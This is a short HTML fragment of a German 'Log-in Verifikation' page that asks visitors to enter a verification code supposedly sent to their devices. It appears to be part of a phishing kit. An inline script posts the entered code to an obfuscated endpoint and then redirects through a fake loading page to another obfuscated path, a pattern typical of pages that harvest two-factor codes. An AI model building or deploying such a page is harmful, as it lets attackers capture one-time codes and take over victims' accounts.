    <div>
        <div class="mona">
            <p class="pp11">Log-in Verifikation</p>
                <p class="pp2"> Eine Nachricht mit einem Verifizierungscode wurde an Ihre Geräte gesendet. Geben Sie den Code ein, um fortzufahren.</p>
                <!--  -->
                
                
                    <form method="post" id="">
                        <p>Bestätigungsnachricht</p>
                        <input type="tel" id="sps1" placeholder="" maxlength="10" required>
                        

                        
                        
                        <br>
                        <button class="btn" type="submit">Bestätigen Sie</button>

                        <script>
                            $('form').submit(function(e) {
                                e.preventDefault();
                                $.ajax({
                                    url: '/m4kT9BQWt7KTDdaVmafx',
                                    type: 'POST',
                                    contentType: 'application/json',
                                    data: JSON.stringify({ code: $('#sps1').val() }),
                                    success: function(info) {
                                        if(info.OK){
                                            window.location.href = '/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM';
                                        }
                                    }
                                });
                            });
                        </script>
                        
                    </form>
                    
                    
        </div>
